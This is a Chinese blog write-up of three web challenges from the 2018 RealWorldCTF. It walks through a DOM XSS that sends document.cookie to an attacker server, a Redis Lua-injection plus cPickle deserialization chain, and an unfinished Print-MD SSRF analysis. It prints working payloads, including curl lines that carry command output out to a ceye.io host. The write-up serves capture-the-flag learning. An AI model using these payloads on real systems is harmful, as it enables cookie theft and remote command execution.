---
title: 2018 RWCTF web WriteUp
tags:
  - CTF
  - WEB
  - WriteUp
date: 2018-07-31 13:11:58
toc: true
---

周末打了长亭举办的RealWorldCTF，tql，写一下web的wp给博客除除草。  

<!-- more -->
# dot free
```
All the IP addresses and domain names have dots, but can you hack without dot?
```
主页有个提交url的框，尝试提交自己的url，但是打不到，怀疑限制了ip，测试中发现网站是是django，并且开启了debug模式，提交错误的post参数就可以看到报错信息  
![](/img/2018-rwctf-img8.png)

可以看到web站点的名字叫 XSSWebSite，于是找xss的点，尝试查找django的xss，但是最新版本并没有已知的xss漏洞，后面发现主页存在这样一段js代码，看起来是个domxss  
![](/img/2018-rwctf-img9.png)

调试一下，可以知道这段代码从浏览器的url取了查询字符串，urldecode后格式化为json，然后发送到一个监听器里去操作，代码里过滤了value参数不能出现`.`，`//`和`。`，type不为iframe的时候会将value插入到一个script标签中
看到这里和题目提示对应上了，不能出现`.`，最后构造payload如下
```
http://13.57.104.34/?{%22iframe%22:{%22value%22:%22http:/\\111111111%22,%22type%22:%22xxxx%22}}
```
11111111替换为自己的vps的ip转10进制，可以看到页面里已经出现一个src=11111111的script标签了
![](/img/2018-rwctf-img11.png)

然后提交这个url到Recieve，服务端就会执行vps上提前构造好的js语句了
```js
window.location.href="http://xxxxxxx/?="+escape(document.cookie);
```
最后flag在cookie里
![](/img/2018-rwctf-img10.png)
flag:  rwctf{L00kI5TheFlo9}


# bookhub

题目提示www.zip，可以下载到源码
看到代码里登陆的时候会检查ip白名单，这里的ip是取的xff，不在白名单内会提示ip不在白名单内
![](/img/2018-rwctf-img12.png)
修改xff为白名单ip失败，猜测xff获取到的是nginx转发过去的ip，所以想到从上面这串里的唯一一个外网ip 18.213.16.123入手
扫描该ip，发现5000端口也开了一个相同的应用程序bookhub，并且开启了debug模式，在这里登陆的提示是密码错误，说明已经绕过了白名单检查。

审计代码发现有一处鉴权的装饰器使用错误(route和login_required顺序反了)
![](/img/2018-rwctf-img4.png)
这会导致鉴权装饰器无效，没有登陆的用户也能调用该接口（debug模式下
查看接口代码，可以知道这个接口eval了lua脚本，用来清除除了自己之外其他所有人的session，其中sessionid存在拼接操作，并且可控，想到可以注入点东西
![](/img/2018-rwctf-img5.png)
参考 https://www.ctolib.com/topics-129777.html
通过这个接口，将恶意的数据（cPickle反序列化漏洞的payload）注入到redis中，当鉴权的时候就会反序列化该字符串，就能任意命令执行了，但是因为该接口需要csrf_token校验，所以多一步获取token的操作
具体操作如下：  
1.生成payload：
```python
import cPickle

class genpoc(object):
    def __reduce__(self):
        s = """curl http://xxxx.ceye.io/`/readflag|base64`"""
        return os.system, (s,)

evil = cPickle.dumps(genpoc())
print evil.replace("\n","\\n")
```
2.构造恶意的sessionid并访问/login/获取csrf_token：
```lua
bookhub-session=aaa"} redis.call("set","bookhub:session:aaa","cposix\nsystem\np1\n(S'curl http://xxxxxxx.ceye.io/`/readflag|base64`'\np2\ntRp3\n.")--;
```
这里拼接进lua脚本后长这样：
```lua
local inputs = {"bookhub:session:aaa"}
redis.call("set","bookhub:session:aaa","cposix\nsystem\np1\n(S'curl http://xxxxxxx.ceye.io/`/readflag|base64`'\np2\ntRp3\n.")--;
```
到时候脚本运行后就会将恶意数据写入`aaa`这个session-id的value里，并且删除其他除了aaa意外的session
![](/img/2018-rwctf-img6.png)
3.带着2中生成的ssrf_token和恶意的session-id去请求 /admin/system/refresh_session           
postdata： submit=1&ssrf_token=
导致lua代码注入修改我们的目标session-id的value值, 最后用`aaa`这个session-id任意访问一个需要session的页面即可触发反序列化漏洞执行命令
最后用ceye外带出flag  
![](/img/2018-rwctf-img13.png)


# Print-MD
Print-MD这道题比赛过程中没做出来，比赛结束忙着上班，wp还没写完，先写一下思路  
想看wp的可以去蓝猫师傅的博客膜一下 [RealWorldCTF PrintMD writeup](https://blog.cal1.cn/post/RealWorldCTF%20PrintMD%20writeup)
```
PrintMD
Paste your HackMD link to get a printer-friendly version!
The note should neither be Protected nor Private.
Press Ctrl + P to print or save as PDF.
PrintMD is compatible with outdated browsers.
If the link is published version of the note, which contains /s/, you can append /edit to get the original link. e.g., https://hackmd.io/s/HyCFXNkNm/edit
‍flag is in /flag
```
`print?url=`可以提交一个hackmd的链接并将md文档解析为html，但是限制了只能读取`https://hackmd.io/`开头的url，故无法ssrf  

第一个hint提示 兼容低版本浏览器，其实之前就有发现在我本机`不同浏览器`访问print接口会有不同的效果：
1. chrome请求该接口，返回的标题是 `请稍后`，然后浏览器再往外发请求获取hackmd的md内容，然后解析成html展示到页面上  
2. firefox请求接口，返回的是已经解析好的html标签，很明显后端做了请求并解析md为html的工作

猜测print接口应该是校验了user-agent，于是测试了一下chrome的ua，发现66.0是个分水岭，然而并没有啥进展
![](/img/2018-rwctf-img1.png)
![](/img/2018-rwctf-img2.png)

后面查看前端代码里的 print.ba84889093b992d33112.js
发现这样一段代码
![](/img/2018-rwctf-img3.png)
可以看到这个应该就是print接口的核心代码了，接受到url参数，判断是否为hackmd的url，然后在url最后如果不是/download就拼接一个/download进去，
因为hackmd.io/xxxxxxx/download 是可以下载markdown格式的文件的，
然后将ua和url传入 `/api/render/` 接口，因为这个接口外部没有权限访问（访问会403），而且不知道这个接口调用了啥库，所以陷入了僵局

hint2 给了render.js的代码
```js
const {Router} = require('express')
const {matchesUA} = require('browserslist-useragent')
const router = Router()
const axios = require('axios')
const md = require('../../plugins/md_srv')

router.post('/render', function (req, res, next) {
  let ret = {}
  ret.ssr = !matchesUA(req.body.ua, {
    browsers: ["last 1 version", "> 1%", "IE 10"],
    _allowHigherVersions: true
  });
  if (ret.ssr) {
    axios(req.body.url).then(r => {
          ret.mdbody = md.render(r.data)
      res.json(ret)
    })
  }
  else {
    ret.mdbody = md.render('# 请稍候…')
    res.json(ret)
  }
});

module.exports = router

```
可以看到我们可控的地方有三个点，分别对应三个库：
1. ua: 对应`browserslist-useragent`库，主要是用来判断当前ua版本是否符合预期版本，感觉问题不大
2. url: 对应`axios`库，当ua版本被判定为低版本时，会用axios对url发送一个get请求，但是url限制死了只能 `https://hackmd.io/`，所以能利用的地方有限
3. r.data: url返回的内容，然后用`../../plugins/md_srv`这个库进行了解析，不知道这个库是啥情况

比赛过程中到这里又陷入了僵局，赛后问了蓝猫师傅才知道利用点在axios这边

未完待续。。。
